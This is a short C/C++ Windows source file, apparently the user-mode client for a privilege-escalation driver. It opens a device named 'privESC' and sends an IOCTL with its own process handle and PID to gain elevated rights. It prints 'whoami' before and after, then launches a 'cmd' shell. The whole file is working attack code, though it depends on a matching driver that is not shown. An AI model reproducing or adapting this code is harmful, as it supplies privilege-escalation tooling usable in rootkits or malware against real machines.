#include <Windows.h>
#include <stdio.h>

#define IOCTL_SET_PRIVILEGE CTL_CODE(0x8000,0x800, METHOD_IN_DIRECT, FILE_ANY_ACCESS)
struct ProcessData {
	HANDLE ProcessHandle;
	int pid;

};

int main(int argc, const char* argv[])
{
	printf("This is who you are -> ");

	system("whoami");


	HANDLE hDevice = CreateFile(L"\\\\.\\privESC", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("Error opening device(%u)\n", GetLastError());
		return 1;
	}

	HANDLE hProcess = GetCurrentProcess();
	ProcessData ioctlStruct;
	ioctlStruct.ProcessHandle = hProcess;
	ioctlStruct.pid = GetCurrentProcessId();
	printf("Pid -> %x\n", ioctlStruct.pid);


	DWORD bytes;
	BOOL ok = DeviceIoControl(hDevice, IOCTL_SET_PRIVILEGE, &ioctlStruct,sizeof(ioctlStruct), 0, 0, &bytes, nullptr);

	if (!ok) {
		printf("Error in DeviceIoControl (%u)\n", GetLastError());
		return 1;
	}

	CloseHandle(hDevice);
	//printf("Now You Are Waiting!!\n");
	//getchar(); // no more waiting kıpss
	printf("Guesss now who you are!!!\nType whoami???\n");

	system("cmd");
	return 0;
}

